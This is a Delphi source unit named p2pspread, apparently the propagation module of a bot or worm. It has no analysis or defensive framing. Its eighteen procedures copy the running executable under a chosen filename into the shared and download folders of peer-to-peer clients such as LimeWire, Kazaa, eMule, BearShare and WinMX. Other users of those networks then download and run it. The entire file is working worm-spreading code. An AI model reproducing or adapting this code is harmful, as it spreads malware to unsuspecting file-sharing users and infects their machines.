unit p2pspread;

interface

uses Windows, functions, KOL;



procedure Spreadp2p(FileName: String);

implementation
uses BOT;



procedure InjectLimeWire(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'LimeWire\Shared';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'LimeWire\Shared';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectEdonkey2k(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'eDonkey2000\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'eDonkey2000\temp';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'eDonkey2000 Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectKazaa(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Kazaa Lite K++\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Kazaa Lite K++\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'KaZaA\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'KaZaA\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectEmule(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Emule\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectDownload(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'Download';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Download';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'My Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'My Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'Incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
    progdir := Functions.Get_Prog_Dir;
  progdir := progdir[1] + progdir[2] + progdir[3];
  progdir := progdir + 'My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectKMD(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'KMD\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'KMD\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectMorpheus(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Morpheus\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Morpheus\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectBearShare(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'BearShare\Shared';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'BearShare\Shared';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Shared';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectAppleJuice(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'appleJuice\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'appleJuice\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectGnucleus(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Gnucleus\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Gnucleus\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectGrokster(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Grokster\My Grokster';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Grokster\My Grokster';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectOvernet(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Overnet\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Overnet\incoming';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectShareaza(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Shareaza\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Shareaza\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectSwaptor(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Swaptor\Download';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Swaptor\Download';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectWinMX(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'WinMX\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'WinMX\My Shared Folder';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;


procedure InjectTesla(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Tesla\Files';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Tesla\Files';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectXoloX(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'XoloX\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'XoloX\Downloads';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;

procedure InjectRapigator(FileName: String);
var progdir: String;
begin
  progdir := Functions.Get_Prog_Dir;
  progdir := progdir + 'Rapigator\Share';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
  progdir := Get_PERS_DIR;
  progdir := progdir + 'Rapigator\Share';
  If KOL.DirectoryExists(progdir) then
  begin
    progdir := progdir + '\' + FileName;
    CopyFile(PChar(ParamStr(0)), PChar(progdir), False);
  end;
end;




procedure Spreadp2p(FileName: String);
begin
  InjectLimeWire(FileName);
  InjectEdonkey2k(FileName);
  InjectKazaa(FileName);
  InjectEmule(FileName);
  InjectDownload(FileName);
  InjectKMD(FileName);
  InjectMorpheus(FileName);
  InjectBearShare(FileName);
  InjectAppleJuice(FileName);
  InjectGnucleus(FileName);
  InjectGrokster(FileName);
  InjectOvernet(FileName);
  InjectShareaza(FileName);
  InjectSwaptor(FileName);
  InjectWinMX(FileName);
  InjectTesla(FileName);
  InjectXoloX(FileName);
  InjectRapigator(FileName);
end;


end.
